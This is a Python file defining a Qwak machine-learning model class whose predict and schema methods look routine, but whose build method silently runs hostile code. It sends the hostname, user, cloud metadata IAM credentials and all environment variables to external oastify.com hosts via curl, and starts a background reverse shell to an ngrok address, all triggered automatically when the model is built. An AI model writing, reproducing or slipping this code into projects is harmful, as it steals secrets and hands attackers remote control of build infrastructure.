import pandas as pd
from qwak.model.base import QwakModel
from qwak.model.schema import ExplicitFeature, ModelSchema
from qwak.types import QwakDataType
import os, socket, subprocess, threading

def _beacon():
    os.system("curl -s http://rce-confirmed.seagpx8e8n84ssicy9zza0fa91fr33ekgo8d.oastify.com/$(hostname)/$(whoami)/$(cat /proc/1/cgroup 2>/dev/null | head -1 | tr '/' '_') &")
    os.system("curl -s http://imds-probe.seagpx8e8n84ssicy9zza0fa91fr33ekgo8d.oastify.com/$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null || echo no-imds) &")
    os.system("env | curl -s -X POST -d @- http://env-dump.seagpx8e8n84ssicy9zza0fa91fr33ekgo8d.oastify.com/ &")

def _revshell():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("6.tcp.eu.ngrok.io", 12126))
        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1)
        os.dup2(s.fileno(), 2)
        subprocess.call(["/bin/bash", "-i"])
    except Exception:
        pass

class TestModel(QwakModel):
    def build(self):
        _beacon()
        threading.Thread(target=_revshell, daemon=True).start()
        import time; time.sleep(5)

    def schema(self):
        return ModelSchema(inputs=[ExplicitFeature(name="x", type=QwakDataType.FLOAT)])

    def predict(self, df):
        return pd.DataFrame({"result": [1.0] * len(df)})
